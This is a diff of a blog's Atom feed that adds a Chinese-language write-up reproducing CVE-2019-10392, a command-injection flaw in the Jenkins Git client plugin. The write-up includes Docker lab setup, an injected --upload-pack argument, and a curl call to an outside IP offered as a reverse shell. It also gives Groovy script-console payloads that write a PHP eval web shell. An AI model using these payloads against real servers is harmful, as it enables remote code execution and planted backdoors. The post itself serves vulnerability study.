@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.twosmi1e.com/"/>
-  <updated>2018-12-25T11:06:59.166Z</updated>
+  <updated>2019-10-16T06:08:20.881Z</updated>
   <id>https://www.twosmi1e.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2019-10392：Jenkins Git client插件RCE复现</title>
+    <link href="https://www.twosmi1e.com/2019/10/16/CVE-2019-10392%EF%BC%9AJenkins-Git-client%E6%8F%92%E4%BB%B6RCE%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/</id>
+    <published>2019-10-16T06:03:38.000Z</published>
+    <updated>2019-10-16T06:08:20.881Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://jenkins.io/security/advisory/2019-09-12/" target="_blank" rel="external">https://jenkins.io/security/advisory/2019-09-12/</a><br>Git客户端插件接受用户指定的值作为git ls-remote调用的参数，以验证指定URL处是否存在Git存储库。 这种方式允许具有Job / Configure权限的攻击者，以运行Jenkins进程的OS用户的权限在Jenkins主服务器上执行任意系统命令。当以root权限运行Jenkins时，攻击者将会通过攻击得到root权限。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git client Plugin &lt;= 2.8.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker搭建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search jenkins</span><br><span class="line">docker pull jenkins/jenkins</span><br><span class="line">映射8080端口</span><br><span class="line">docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins</span><br></pre></td></tr></table></figure></p><p>访问IP:8080后需要输入密码<br>进入容器获取密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 79931fdd69d5 /bin/bash</span><br><span class="line">jenkins@79931fdd69d5:/$ cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p><p>开始安装<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701368800.png" alt="Alt text"><br>安装完成后会让你创建用户，随便创建一个后进入界面。<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701989181.png" alt="Alt text"><br>选择Manage来新建用户<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702166984.png" alt="Alt text"><br>创建一个非管理员用户并在Configure Global Security里给予如图权限<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702599654.png" alt="Alt text"><br>下载漏洞版本插件<br><a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a><br><a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a><br>将两个插件上传<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570761278914.png" alt="Alt text"><br>安装完成后重启<img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570762944751.png" alt="Alt text"><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570763755386.png" alt="Alt text"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录创建的非管理用户<br>创建一个流水线任务</p><p>在连接git仓库处输入payload<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764278108.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`ls`&quot;</span><br></pre></td></tr></table></figure></p><p>反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`curl http://106.54.229.29:9999`&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764547092.png" alt="Alt text"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看文档<a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="external">https://git-scm.com/docs/git-ls-remote.html</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570772486756.png" alt="Alt text"><br>在远程主机上指定git-upload-pack的完整路径。 这允许列出通过SSH访问的存储库中的引用，并且SSH守护程序不使用用户配置的PATH。由此可以在服务器上执行任意命令。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>实际上是一个比较鸡肋的洞，服务器上必须要低版本插件，并且配合弱口令或者未授权才能进入后台利用。</p><p>其实在后台有个地方能直接执行命令<br>在<a href="http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。" target="_blank" rel="external">http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570773935872.png" alt="Alt text"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">println(&quot;id&quot;.execute().getText())</span><br><span class="line"></span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[test]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[test]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&quot;$webshell&quot;);</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-09-12/&quot; tar
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞复现" scheme="https://www.twosmi1e.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>PHP反序列化</title>
